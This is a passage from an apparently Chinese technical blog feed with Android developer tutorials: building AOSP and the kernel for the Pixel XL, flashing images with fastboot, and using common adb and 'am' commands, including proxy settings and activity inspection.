class="hljs-regexp">/aosp-monthly/</span>aosp-latest.tar<br></code></pre></td></tr></table></figure><p>解压缩,解压缩完成之后会多出来~/aosp目录<br>切进去</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">tar</span> zxvf aosp-latest.tar<br></code></pre></td></tr></table></figure><p>cd  aosp </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">repo init -u https://aosp.tuna.tsinghua.edu.cn/platform/manifest -b android-<span class="hljs-number">10.0</span><span class="hljs-number">.0</span>_r17<br>repo sync -c --no-tags --prune -f -j4  <span class="hljs-comment">#线程根据cpu核数决定 一般为cpu核数x2，此处采用4线程</span><br></code></pre></td></tr></table></figure><h3 id="4-驱动下载"><a href="#4-驱动下载" class="headerlink" title="4. 驱动下载"></a>4. 驱动下载</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>developers.google.com<span class="hljs-regexp">/android/</span>drivers<span class="hljs-comment">#sailfishqp1a.190711.020</span><br></code></pre></td></tr></table></figure><p>下载google_devices-sailfish-qp1a.191005.007.a3-a1615a0f.tgz</p><p>qcom-sailfish-qp1a.191005.007.a3-191228fe.tgz<br>两个压缩包，191005.007.a3为当时最新版本驱动</p> <img src="/2021/08/22/pixel-XL-AOSP%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91/images/%E9%A9%B1%E5%8A%A8%E4%B8%8B%E8%BD%BD.png" class=""><p>下载完成后解压会获得两个.sh脚本文件，运行两个脚本后会生成vendor文件夹，将vendor文件夹拷贝到<strong>源码根目录</strong>下</p><h3 id="5-编译环境"><a href="#5-编译环境" class="headerlink" title="5. 编译环境"></a>5. 编译环境</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get install git-core openjdk-8-jdk gnupg flex bison gperf build-essential zip curl zlib1g-dev gcc-multilib g++-multilib libc6-dev-i386 lib32ncurses5-dev x11proto-core-dev libx11-dev lib32z-dev ccache libxml2-utils xsltproc unzip<br></code></pre></td></tr></table></figure><h3 id="6-编译脚本准备"><a href="#6-编译脚本准备" class="headerlink" title="6. 编译脚本准备"></a>6. 编译脚本准备</h3><p>进去源码根目录下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">source ./build/envsetup.sh <br>lunch aosp_sailfish-userdebug <span class="hljs-comment">#也可以命令行lunch回车稍等片刻输入 然后输入15即可</span><br><br><span class="hljs-comment">#调整一个Java参数，要不然会出现Java OOM错误</span><br>export JACK_SERVER_VM_ARGUMENTS=<span class="hljs-string">&quot;-Dfile.encoding=UTF-8 -XX:+TieredCompilation -Xmx4096m&quot;</span><br><br></code></pre></td></tr></table></figure><p>注: 我们可以在aosp/build/tools/buildinfo.sh  vendor_buildinfo.sh 这两个文件中直接修改手机品牌的名字,厂家等信息</p><h3 id="7-开始编译"><a href="#7-开始编译" class="headerlink" title="7. 开始编译"></a>7. 开始编译</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">make -j6   <span class="hljs-comment">#线程视配置而定</span><br><br><span class="hljs-comment">#编译的结果在 ~/aosp/out/target/product/marlin 文件夹中</span><br><span class="hljs-comment">#比较重要的几个是：</span><br><br>boot.img<br>recovery.img<br>ramdisk.img<br>system.img<br>userdata.img<br></code></pre></td></tr></table></figure><h3 id="8-刷机"><a href="#8-刷机" class="headerlink" title="8. 刷机"></a>8. 刷机</h3><p>回到源码根目录下输入</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">fastboot flashall -w</span><br></code></pre></td></tr></table></figure><p>注 lanch命令为我们设置好了ANDROID_PRODUCT_OUT变量的值为编译文件目录确保它的值和编译后镜像输出目录的路径值一致。如果不一致的话，重新设置ANDROID_PRODUCT_OUT的值与编译后镜像输出目录路径值一致。 </p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="fastboot"><a href="#fastboot" class="headerlink" title="fastboot"></a>fastboot</h3><p>一、Fastboot</p><p>1.1 Recovery模式(卡刷)</p><p>在系统进行定制时，编译系统会编译出一份ZIP的压缩包，里面是一些系统分区镜像，提供给客户进行手动升级、恢复系统。需要提前将压缩包内置SDcard，在Recovery模式进行。</p><p>进入Recovery方法：将手机完全关机后，按住音量键下(上)+电源键，进入BootLoader界面。用音量加减来控制光标，电源键来进行确认(有的机器只能用音量下键进行选择，上键是确认键)。说明：有的机器可能没有预装Recovery。</p><p>1.2 Recovery模式(线刷)</p><p>在安卓手机中Fastboot是一种比Recovery更底层的刷机模式。使用USB数据线连接手机的一种刷机模式。这就是所谓的线刷，与Recovery模式相比Fastboot需要掌握一些烧机命令，对于某些系统卡刷来说，线刷更可靠，安全。</p><p>二、Android系统分区介绍</p><ul><li><p>bootloader     系统开机引导类似电脑BIOS，这块刷错手机就会<strong>变成砖</strong></p></li><li><p>radio     通讯模块、基带、WIFI、Bluetooth等衔接硬件的驱动软件</p></li><li><p>recovery     系统故障时负责恢复</p></li><li><p>boot     Linux嵌入式系统内核</p></li><li><p>system     系统文件、应用</p></li><li><p>cache     系统运行时产生的缓存</p></li><li><p>userdata     用户使用APP产生的缓存数据</p></li></ul><h3 id="模块编译介绍"><a href="#模块编译介绍" class="headerlink" title="模块编译介绍"></a>模块编译介绍</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#除了通过make命令编译可以整个android源码外,Google也为我们提供了相应的命令来支持单独模块的编译.</span><br><span class="hljs-comment">#编译环境初始化(即执行source build/envsetup.sh)之后,我们可以得到一些有用的指令,除了上边用到的lunch,还有以下:</span><br><br>  - croot: Changes directory to the top of the tree.<br>  - m: Makes <span class="hljs-keyword">from</span> the top of the tree.<br>  - mm: Builds <span class="hljs-built_in">all</span> of the modules <span class="hljs-keyword">in</span> the current directory.<br>  - mmm: Builds <span class="hljs-built_in">all</span> of the modules <span class="hljs-keyword">in</span> the supplied directories.<br>  - cgrep: Greps on <span class="hljs-built_in">all</span> local C/C++ files.<br>  - jgrep: Greps on <span class="hljs-built_in">all</span> local Java files.<br>  - resgrep: Greps on <span class="hljs-built_in">all</span> local res/*.xml files.<br>  - godir: Go to the directory containing a file.<br></code></pre></td></tr></table></figure><p>其中mmm指令就是用来编译指定目录.通常来说,每个目录只包含一个模块.比如这里我们要编译Launcher2模块,执行指令:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mmm packages<span class="hljs-regexp">/apps/</span>Launcher2/<br></code></pre></td></tr></table></figure><p>稍等一会之后,如果提示:</p><p>make completed success fully </p><p>即表示编译完成,此时在out/target/product/gereric/system/app就可以看到编译的Launcher2.apk文件了.</p><h3 id="重新打包系统镜像"><a href="#重新打包系统镜像" class="headerlink" title="重新打包系统镜像"></a>重新打包系统镜像</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">编译好指定模块后,如果我们想要将该模块对应的apk集成到系统镜像中,需要借助<span class="hljs-keyword">make</span> snod指令重新打包系统镜像,这样我们新生成的<span class="hljs-built_in">system</span>.img中就包含了刚才编译的Launcher2模块了.重启机器之后生效.<br></code></pre></td></tr></table></figure><h3 id="单独安装模块"><a href="#单独安装模块" class="headerlink" title="单独安装模块"></a>单独安装模块</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">我们在不断的修改某些模块,总不能每次编译完成后都要重新打包<span class="hljs-built_in">system</span>.img,然后重启手机吧?有没有什么简单的方法呢?<br>在编译完后,借助adb install命令直接将生成的apk文件安装到设备上即可,相比使用<span class="hljs-keyword">make</span> snod,会节省很多事件.<br></code></pre></td></tr></table></figure><h3 id="编译目录介绍"><a href="#编译目录介绍" class="headerlink" title="编译目录介绍"></a>编译目录介绍</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs out/target/product/generic/system```目录下的常用目录:"><br>- Android系统自带的apk文件都在```out/target/product/generic/system/apk```目录下<br>- 一些可执行文件(比如C编译的执行),放在```out/target/product/generic/system/bin```目录下<br>- 动态链接库放在```out/target/product/generic/system/lib```目录下<br>- 硬件抽象层文件都放在```out/targer/product/generic/system/lib/hw```目录下<br><br>### 源码目录介绍<br><br>![](https://img2020.cnblogs.com/blog/2275974/202101/2275974-20210109203736099-1901913006.png)<br><br><br>![](https://img2020.cnblogs.com/blog/2275974/202101/2275974-20210109203759902-672469351.png)<br><br><br>### lunch 后面的参数介绍<br><br></code></pre></td></tr></table></figure><p>lunch aosp_arm-eng</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs gherkin"><br>该命令表示针对模拟器进行完整编译，并且所有调试功能均处于启用状态。<br><br>如果您没有提供任何参数就运行命令，lunch 将提示您从菜单中选择一个目标。<br><br>所有编译目标都采用 BUILD-BUILDTYPE 形式，其中 BUILD 是表示特定功能组合的代号。<br><br>BUILDTYPE 是以下类型之一：<br><br><br>|<span class="hljs-string"> 编译类型  </span>|<span class="hljs-string"> 使用情况                                                     </span>|<br>|<span class="hljs-string"> --------- </span>|<span class="hljs-string"> ------------------------------------------------------------ </span>|<br>|<span class="hljs-string"> user      </span>|<span class="hljs-string"> 适用于生产环境                                               </span>|<br>|<span class="hljs-string"> userdebug </span>|<span class="hljs-string"> 与“user”类似，但具有 root 权限和可调试性；是进行调试时的首选编译类型 </span>|<br>|<span class="hljs-string"> eng       </span>|<span class="hljs-string"> eng具有额外调试工具的开发配置                            </span>|<br><br>![](https://img2020.cnblogs.com/blog/2275974/202101/2275974-20210109203911293-1939592244.png)<br><br><br>![](https://img2020.cnblogs.com/blog/2275974/202101/2275974-20210109204041185-295820055.png)<br><br><br><br> <span class="hljs-comment">### 单独刷入某个 img：</span><br><br>fastboot刷入命令格式：fastboot flash 系统分区 对应的name.img<br><br> ```shell<br>cd out/target/product/marlin<br>fastboot flash boot_a boot.img<br>fastboot flash boot_b boot.img<br>fastboot flash system system.img<br>fastboot flash system_b system_other.img<br>fastboot flash vendor vendor.img<br>fastboot flash userdata userdata.img<br>fastboot flash userdata data.img<br></code></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/wengliuhu/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">107979371</span> 源码目录介绍<br>https:<span class="hljs-regexp">//</span>developers.google.cn<span class="hljs-regexp">/android/im</span>ages<span class="hljs-comment">#marlin 官网刷机包，救砖</span><br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/u012417380/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">73196722</span> lunch参数介绍<br>https:<span class="hljs-regexp">//</span>source.android.com<span class="hljs-regexp">/source/</span>building 官网刷机教程<br>https:<span class="hljs-regexp">//</span>www.dazhuanlan.com<span class="hljs-regexp">/2019/</span><span class="hljs-number">12</span><span class="hljs-regexp">/09/</span><span class="hljs-number">5</span>dedf04e496e7  Android8 分区表变化和相关信息<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>android</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android</tag>
      
      <tag>rom</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pixel XL内核编译</title>
    <link href="/2021/08/22/pixel-XL%E5%86%85%E6%A0%B8%E7%BC%96%E8%AF%91/"/>
    <url>/2021/08/22/pixel-XL%E5%86%85%E6%A0%B8%E7%BC%96%E8%AF%91/</url>
    
    <content type="html"><![CDATA[<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><ul><li>操作系统 ：虚拟机 ubuntu 16.04</li><li>内存 ：8G</li><li>硬盘 ：150G</li><li>CPU ：4核</li></ul><h2 id="编译过程"><a href="#编译过程" class="headerlink" title="编译过程"></a>编译过程</h2><p>注： 编译环境见pixel XL源码编译</p><h3 id="1-源码分支获取"><a href="#1-源码分支获取" class="headerlink" title="1. 源码分支获取"></a>1. 源码分支获取</h3><p>根据手机型号选择分支名称</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>source.android.google.cn<span class="hljs-regexp">/setup/</span>build/building-kernels?hl=zh-cn<span class="hljs-comment">#customize-build</span><br></code></pre></td></tr></table></figure><p>Pixel XL的分支名称为android-msm-marlin-3.18-pie-qpr2</p> <img src="/2021/08/22/pixel-XL%E5%86%85%E6%A0%B8%E7%BC%96%E8%AF%91/images/%E5%88%86%E6%94%AF%E5%90%8D%E7%A7%B0.png" class=""><h3 id="2-下载源码"><a href="#2-下载源码" class="headerlink" title="2. 下载源码"></a>2. 下载源码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#共4G文件需要梯子，挂个vpn 大约2个小时下完</span><br>mkdir android-kernel &amp;&amp; cd android-kernel<br><br>repo init -u https://android.googlesource.com/kernel/manifest -b android-msm-marlin-<span class="hljs-number">3.18</span>-pie-qpr2<br>repo sync<br></code></pre></td></tr></table></figure><h3 id="3-构建"><a href="#3-构建" class="headerlink" title="3. 构建"></a>3. 构建</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#构建aarch64的内核版本</span><br>./build/build.sh  BUILD_CONFIG=common/build.config.gki.aarch64<br></code></pre></td></tr></table></figure><p>注:此处可能会报错</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">build/buildinfo/buildinfo.py <span class="hljs-keyword">not</span> found<br></code></pre></td></tr></table></figure><p>编辑build.config,将EXTRA_CMDS=’python build/buildinfo/buildinfo.py’ 删除，实测可以编译成功</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">KERNEL_DIR=private/msm-google<br>. $&#123;ROOT_DIR&#125;/$&#123;KERNEL_DIR&#125;/build.config.common<br>POST_DEFCONFIG_CMDS=<span class="hljs-string">&quot;check_defconfig &amp;&amp; compression_tool_and_files lz4&quot;</span><br>EXTRA_CMDS=<span class="hljs-string">&#x27;python build/buildinfo/buildinfo.py&#x27;</span>      <span class="hljs-comment"># &lt;----删除此行</span><br>STOP_SHIP_TRACEPRINTK=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>编译成功后内核二进制文件、模块和相应的映像位于 out/android-msm-marlinxxxxx/dist 目录下。</p><h3 id="4-刷机"><a href="#4-刷机" class="headerlink" title="4. 刷机"></a>4. 刷机</h3><h4 id="4-1-临时刷入"><a href="#4-1-临时刷入" class="headerlink" title="4.1 临时刷入"></a>4.1 临时刷入</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#刷入out/xxx/Image.lz4-dtb </span><br><span class="hljs-comment">#临时有效，重启恢复之前内核</span><br><br>adb reboot bootloader<br>fastboot boot Image.lz4-dtb  <br></code></pre></td></tr></table></figure><h4 id="4-2-永久刷入"><a href="#4-2-永久刷入" class="headerlink" title="4.2 永久刷入"></a>4.2 永久刷入</h4><h5 id="4-2-1-拷贝内核文件到AOSP项目下"><a href="#4-2-1-拷贝内核文件到AOSP项目下" class="headerlink" title="4.2.1 拷贝内核文件到AOSP项目下"></a>4.2.1 拷贝内核文件到AOSP项目下</h5><p>将<code>out/xxx/Image.lz4-dtb</code> 拷贝到<code> device/google/marlin-kernel</code>下（以防万一拷贝之前备份<code>device/google/marlin-kernel/Image.lz4-dtb</code>）</p><h5 id="4-2-2-编译aosp"><a href="#4-2-2-编译aosp" class="headerlink" title="4.2.2  编译aosp"></a>4.2.2  编译aosp</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">source build/envsetup.sh<br>lunch <span class="hljs-number">15</span>   <span class="hljs-comment">#根据机型选择不同版本</span><br>make bootimage<br></code></pre></td></tr></table></figure><h5 id="4-2-3-编译完成刷入系统"><a href="#4-2-3-编译完成刷入系统" class="headerlink" title="4.2.3 编译完成刷入系统"></a>4.2.3 编译完成刷入系统</h5><p>刷入/out/target/product/marlin/boot.img</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">fastboot flash boot boot.img<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>android</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android</tag>
      
      <tag>rom</tag>
      
      <tag>内核</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>adb查看当前Activity</title>
    <link href="/2021/08/22/adb%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8DActivity/"/>
    <url>/2021/08/22/adb%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8DActivity/</url>
    
    <content type="html"><![CDATA[<h2 id="Android-8-1前"><a href="#Android-8-1前" class="headerlink" title="Android 8.1前"></a>Android 8.1前</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">adb <span class="hljs-keyword">shell</span> dumpsys activity | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;mFocus&quot;</span><br></code></pre></td></tr></table></figure><h2 id="Android-8-1-后"><a href="#Android-8-1-后" class="headerlink" title="Android 8.1 后"></a>Android 8.1 后</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">adb <span class="hljs-keyword">shell</span> dumpsys activity | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;mResume&quot;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>android</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android</tag>
      
      <tag>adb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>adb设置代理</title>
    <link href="/2021/08/22/adb%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/"/>
    <url>/2021/08/22/adb%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h2 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">adb shell settings put global http_proxy 127.0.0.1:8888<br></code></pre></td></tr></table></figure><h2 id="移除代理（需要重启）："><a href="#移除代理（需要重启）：" class="headerlink" title="移除代理（需要重启）："></a>移除代理（需要重启）：</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">adb shell settings delete global http_proxy<br><br>adb shell settings delete global global_http_proxy_host<br><br>adb shell settings delete global global_http_proxy_port<br><br>adb reboot<br></code></pre></td></tr></table></figure><h2 id="不重启移除代理"><a href="#不重启移除代理" class="headerlink" title="不重启移除代理:"></a>不重启移除代理:</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">adb shell settings put global http_proxy :0<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>android</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android</tag>
      
      <tag>adb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>am常用命令</title>
    <link href="/2021/08/21/am%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <url>/2021/08/21/am%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h2 id="拨打电话10086"><a href="#拨打电话10086" class="headerlink" title="拨打电话10086"></a>拨打电话10086</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">adb shell am start -<span class="hljs-selector-tag">a</span> android<span class="hljs-selector-class">.intent</span><span class="hljs-selector-class">.action</span><span class="hljs-selector-class">.CALL</span> -d tel:<span class="hljs-number">10086</span><br></code></pre></td></tr></table></figure><h2 id="打开网址"><a href="#打开网址" class="headerlink" title="打开网址"></a>打开网址</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">adb shell am start -<span class="hljs-selector-tag">a</span> android<span class="hljs-selector-class">.intent</span><span class="hljs-selector-class">.action</span><span class="hljs-selector-class">.VIEW</span> -d  http:<span class="hljs-comment">//gityuan.com</span><br></code></pre></td></tr></table></figure><h2 id="启动Activity"><a href="#启动Activity" class="headerlink" title="启动Activity"></a>启动Activity</h2><p> 启动包名为<code>com.yuanhh.app</code>，主Activity为<code>.MainActivity</code>  且extra数据以”website”为key, “yuanh.com”为value</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">am</span> start -n <span class="hljs-keyword">com</span>.yuanhh.app/.MainActivity -es website gityuan.<span class="hljs-keyword">com</span><br></code></pre></td></tr></table></figure><h2 id="发送广播"><a href="#发送广播" class="headerlink" title="发送广播"></a>发送广播</h2><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">adb shell am broadcast -a com.android.test <span class="hljs-params">--es</span> test_string <span class="hljs-string">&quot;this is test string&quot;</span> <span class="hljs-params">--ei</span> test_int 100 <span class="hljs-params">--ez</span> test_boolean <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>命令列表：</p><table><thead><tr><th align="left">命令</th><th align="left">功能</th><th align="left">实现方法</th></tr></thead><tbody><tr><td align="left">am start [options] <INTENT></td><td align="left">启动Activity</td><td align="left">startActivityAsUser</td></tr><tr><td align="left">am startservice <INTENT></td><td align="left">启动Service</td><td align="left">startService</td></tr><tr><td align="left">am stopservice <INTENT></td><td align="left">停止Service</td><td align="left">stopService</td></tr><tr><td align="left">am broadcast <INTENT></td><td align="left">发送广播</td><td align="left">broadcastIntent</td></tr><tr><td align="left">am kill <PACKAGE></td><td align="left">杀指定后台进程</td><td align="left">killBackgroundProcesses</td></tr><tr><td align="left">am kill-all</td><td align="left">杀所有后台进程</td><td align="left">killAllBackgroundProcesses</td></tr><tr><td align="left">am force-stop <PACKAGE></td><td align="left">强杀进程</td><td align="left">forceStopPackage</td></tr><tr><td align="left">am hang</td><td align="left">系统卡住</td><td align="left">hang</td></tr><tr><td align="left">am restart</td><td align="left">重启</td><td align="left">restart</td></tr><tr><td align="left">am bug-report</td><td align="left">创建bugreport</td><td align="left">requestBugReport</td></tr><tr><td align="left">am dumpheap <pid> <file></td><td align="left">进程pid的堆信息输出到file</td><td align="left">dumpheap</td></tr><tr><td align="left">am send-trim-memory <pid> <level></td><td align="left">收紧进程的内存</td><td align="left">setProcessMemoryTrimLevel</td></tr><tr><td align="left">am monitor</td><td align="left">监控</td><td align="left">MyActivityController.run</td></tr></tbody></table><p>am命令实的实现方式在Am.java，最终几乎都是调用<code>ActivityManagerService</code>相应的方法来完成的，<code>am monitor</code>除外。比如前面概述中介绍的命令<code>am start -a android.intent.action.VIEW -d http://gityuan.com</code>， 启动Acitivty最终调用的是ActivityManagerService类的startActivityAsUser()方法来完成的。再比如<code>am kill-all</code>命令，最终的实现工作是由ActivityManagerService的killBackgroundProcesses()方法完成的</p><h2 id="Options"><a href="#Options" class="headerlink" title="Options"></a>Options</h2><p>主要是启动Activity命令<code>am start [options] </code>使用options参数，接下来列举Activity命令的[options]参数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">-D: 允许调试功能<br>-W: 等待app启动完成<br>-R &lt;COUNT&gt;: 重复启动Activity COUNT次<br>-S: 启动activity之前，先调用forceStopPackage()方法强制停止app.<br>–opengl-trace: 运行获取OpenGL函数的trace<br>–user &lt;USER_ID&gt; | current: 指定用户来运行App,默认为当前用户。<br>–start-profiler &lt;FILE&gt;: 启动profiler，并将结果发送到 &lt;FILE&gt;;<br>-P &lt;FILE&gt;: 类似 –start-profiler，不同的是当app进入idle状态，则停止profiling<br>–sampling INTERVAL: 设置profiler 取样时间间隔，单位ms;<br></code></pre></td></tr></table></figure><p>启动Activity的实现原理： 存在-W参数则调用startActivityAndWait()方法来运行，否则startActivityAsUser()。</p><h2 id="收紧内存"><a href="#收紧内存" class="headerlink" title="收紧内存"></a>收紧内存</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">am</span> send-trim-memory  <span class="hljs-symbol">&lt;pid&gt;</span> <span class="hljs-symbol">&lt;level&gt;</span><br></code></pre></td></tr></table></figure><p>例如： 向pid=12345的进程，发出level=RUNNING_LOW的收紧内存命令</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">am send-<span class="hljs-keyword">trim</span>-<span class="hljs-keyword">memory</span> <span class="hljs-number">12345</span> RUNNING_LOW。<br></code></pre></td></tr></table></figure><p>那么level取值范围为： HIDDEN、RUNNING_MODERATE、BACKGROUND、RUNNING_LOW、MODERATE、RUNNING_CRITICAL、COMPLETE。</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>对于am的子命令，startservice, stopservice, broadcast, kill, profile start, profile stop, dumpheap的可选参数都允许设置<code>--user </code>。目前市面上的绝大多数手机还是单用户模式，故可以忽略该参数，默认为当前用户。</p><p>例如：启动id=10010的用户的指定service。</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">am startservice --<span class="hljs-keyword">user</span> <span class="hljs-title">10010</span><br></code></pre></td></tr></table></figure><h2 id="Intent"><a href="#Intent" class="headerlink" title="Intent"></a>Intent</h2><p>Intent的参数和flags较多，分为3种类型参数，常用参数，Extra参数，Flags参数</p><h3 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h3><ul><li><code>-a </code>: 指定Intent action， 实现原理Intent.setAction()；</li><li><code>-n </code>: 指定组件名，格式为{包名}/.{主Activity名}，实现原理Intent.setComponent(）；</li><li><code>-d 